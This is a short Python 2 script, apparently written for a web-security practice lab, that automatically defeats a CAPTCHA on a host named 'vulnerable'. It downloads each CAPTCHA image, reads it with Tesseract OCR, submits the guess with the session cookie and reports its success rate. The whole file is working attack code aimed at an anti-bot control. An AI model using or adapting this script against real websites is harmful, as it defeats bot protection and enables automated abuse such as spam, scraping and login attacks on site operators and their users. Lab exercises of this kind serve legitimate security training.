import httplib, PIL, pytesseract, os, re, sys, urllib

if __name__ == '__main__':
    conn = httplib.HTTPConnection('vulnerable')
    success = 0
    total = 0
    num = int(sys.argv[1])
    for i in range(num):
        conn.request('GET', '/captcha/example6')
        res = conn.getresponse()
        imgurl = 'http://vulnerable/captcha/example6/' + re.findall(r'<img src="(.*)"/ >', res.read())[0]
        urllib.urlretrieve(imgurl, 'temp.png')
        cookie = res.getheader('Set-Cookie')
        captcha = pytesseract.image_to_string(PIL.Image.open('temp.png'))
        if not (captcha.islower() and captcha.isalpha()):
            print 'Skipped!!!'
            continue
        headers = {'Cookie': cookie}
        conn.request('GET', '/captcha/example6/submit?captcha=%s&submit=Submit' % captcha, '', headers)
        res = conn.getresponse()
        if res.read().find('Success!!!') >= 0:
            print 'Success!!!'
            success += 1
        else:
            print 'Failed!!!'
        total += 1
    os.remove('temp.png')
    print 'Total: %d Success: %d' % (total, success)
    print 'Accurate rate: %f%%' % (float(success) / total * 100)
